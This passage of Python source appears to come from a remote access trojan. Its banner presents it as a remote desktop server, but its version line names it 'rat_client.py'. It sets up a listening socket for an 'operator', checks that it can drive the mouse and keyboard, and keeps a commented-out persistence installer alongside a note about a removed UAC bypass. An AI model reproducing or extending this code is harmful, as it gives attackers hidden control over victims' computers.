            print(f"[STARTUP] ✓ Mouse controller working")
        except Exception as e:
            print(f"[STARTUP ERROR] ✗ Mouse controller failed: {e}")

        try:
            pyautogui.press('shift')
            print(f"[STARTUP] ✓ Keyboard controller working")
        except Exception as e:
            print(f"[STARTUP ERROR] ✗ Keyboard controller failed: {e}")

        # Create and bind socket
        print(f"\n[STARTUP] Binding to {LISTEN_ADDRESS}:{RDP_PORT}...")
        logger.info(f"Creating TCP socket for {LISTEN_ADDRESS}:{RDP_PORT}")
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        try:
            logger.debug(f"Attempting to bind socket to {LISTEN_ADDRESS}:{RDP_PORT}")
            server_socket.bind((LISTEN_ADDRESS, RDP_PORT))
            logger.info(f"✓ Successfully bound to port {RDP_PORT}")
            print(f"[STARTUP] ✓ Bound to port {RDP_PORT}")
        except OSError as e:
            if e.errno == 48:  # Address already in use
                logger.error(f"Port {RDP_PORT} already in use (error code 48)")
                print(f"[STARTUP ERROR] ✗ Port {RDP_PORT} already in use!")
                print(f"[STARTUP ERROR] Another process is using this port.")
                print(f"[STARTUP ERROR] Kill the other process or change RDP_PORT")
                return
            elif e.errno == 13:  # Permission denied
                logger.error(f"Permission denied on port {RDP_PORT} (error code 13)")
                print(f"[STARTUP ERROR] ✗ Permission denied on port {RDP_PORT}")
                print(f"[STARTUP ERROR] Try running with sudo or use port > 1024")
                return
            else:
                logger.error(f"Socket binding failed: {e}", exc_info=True)
                raise

        server_socket.listen(5)
        logger.info(f"Server listening on {LISTEN_ADDRESS}:{RDP_PORT}")
        print(f"[STARTUP] ✓ Listening for connections")
        print(f"\n[RDP] Server ready! Waiting for operator to connect...")
        print(f"[RDP] Operator should connect to: {get_local_ip()}:{RDP_PORT}\n")

        while running:
            try:
                logger.debug("Waiting for incoming connections...")
                client_socket, addr = server_socket.accept()
                logger.info(f"✓ New connection accepted from {addr[0]}:{addr[1]}")
                print(f"\n{'='*60}")
                print(f"[CONNECTION] New connection from {addr[0]}:{addr[1]}")
                print(f"[CONNECTION] Active clients: {len(clients) + 1}")
                print(f"{'='*60}")
                sys.stdout.flush()

                # NO THREADING - run directly in main thread so errors show
                print(f"[CONNECTION] Handling connection in main thread (no threading for debugging)")
                sys.stdout.flush()
                handle_client(client_socket, addr)
                print(f"[CONNECTION] Connection handler returned\n")
                sys.stdout.flush()
            except KeyboardInterrupt:
                print("\n[SHUTDOWN] Keyboard interrupt received")
                sys.stdout.flush()
                break
            except socket.error as e:
                print(f"[CONNECTION ERROR] Socket error: {e}")
                sys.stdout.flush()
                import traceback
                traceback.print_exc()
                sys.stdout.flush()
            except Exception as e:
                print(f"[CONNECTION ERROR] Unexpected error in accept loop: {e}")
                print(f"[CONNECTION ERROR] Error type: {type(e).__name__}")
                sys.stdout.flush()
                import traceback
                traceback.print_exc()
                sys.stdout.flush()

    except Exception as e:
        print(f"[RDP FATAL] {e}")
        import traceback
        traceback.print_exc()
    finally:
        if server_socket:
            try:
                server_socket.close()
            except:
                pass

def main():
    """Main entry point"""
    global running

    try:
        print("\n" + "="*70)
        print("REMOTE DESKTOP PROTOCOL (RDP) - SCREEN SHARING SERVER v2.0")
        print("="*70)
        print("[VERSION] rat_client.py v2.0 - WITH DETAILED ERROR LOGGING")
        print("="*70)

        # Persistence disabled - UAC bypass removed
        # install_persistence()

        start_rdp_server()

    except KeyboardInterrupt:
        print("\n[RDP] Shutting down...")
        running = False

        # Close all client connections
        for client in clients:
            try:
                client.close()
            except:
                pass

        sys.exit(0)
    except Exception as e:
        print(f"[CRITICAL ERROR] {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()
